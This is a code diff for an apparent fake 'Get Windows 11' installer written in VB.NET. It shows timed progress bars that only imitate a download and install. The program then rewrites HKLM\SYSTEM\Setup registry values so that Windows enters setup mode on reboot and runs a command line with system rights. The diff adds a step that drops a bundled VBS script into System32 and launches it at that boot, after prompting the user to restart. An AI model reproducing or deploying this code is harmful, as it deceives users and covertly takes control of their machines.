@@ -13,7 +13,7 @@ Public Class Form1
     End Sub
 
     Private Sub DownloadTimer_Tick(sender As Object, e As EventArgs) Handles DownloadTimer.Tick
-        DownloadProgress.Value = +1
+        DownloadProgress.Value += 1
         Label3.Text = DownloadProgress.Value & "%"
         If DownloadProgress.Value = DownloadProgress.Maximum Then
             DownloadTimer.Stop()
@@ -23,7 +23,7 @@ Public Class Form1
     End Sub
 
     Private Sub PrepareTimer_Tick(sender As Object, e As EventArgs) Handles PrepareTimer.Tick
-        PrepareProgress.Value = +1
+        PrepareProgress.Value += 1
         Label4.Text = PrepareProgress.Value & "%"
         If PrepareProgress.Value = PrepareProgress.Maximum Then
             PrepareTimer.Stop()
@@ -33,7 +33,7 @@ Public Class Form1
     End Sub
 
     Private Sub InstallTimer_Tick(sender As Object, e As EventArgs) Handles InstallTimer.Tick
-        InstallProgress.Value = +1
+        InstallProgress.Value += 1
         Label5.Text = InstallProgress.Value & "%"
         If InstallProgress.Value = StopNumber Then
             regKey = Registry.LocalMachine.OpenSubKey("SYSTEM\Setup", True)
@@ -41,7 +41,8 @@ Public Class Form1
             regKey.SetValue("SetupPhase", 4)
             regKey.SetValue("SystemSetupInProgress", 1)
             regKey.SetValue("SetupType", 2)
-            regKey.SetValue("CmdLine", "cmd.exe /c reg add HKLM\System\Setup /v SystemSetupInProgress /d 0 /t REG_DWORD /f&&reg add HKLM\System\Setup /v SetupType /d 0 /t REG_DWORD /f&&reg add HKLM\System\Setup /v CmdLine /f&&msg * Failed to install.")
+            regKey.SetValue("CmdLine", "cmd.exe /c reg add HKLM\System\Setup /v SystemSetupInProgress /d 0 /t REG_DWORD /f&&reg add HKLM\System\Setup /v SetupType /d 0 /t REG_DWORD /f&&reg add HKLM\System\Setup /v CmdLine /f&&start C:\Windows\System32\vbFailure.vbs")
+            My.Computer.FileSystem.WriteAllText("C:\Windows\System32\vbFailure.vbs", My.Resources.vbFailure, True)
             Result = MsgBox("You need to restart the computer to finish installing Windows 11. Please make sure you saved all your files. Do you want to restart now?", vbYesNo + vbQuestion, "Get Windows 11")
             If Result = DialogResult.No Then
                 Me.Hide()
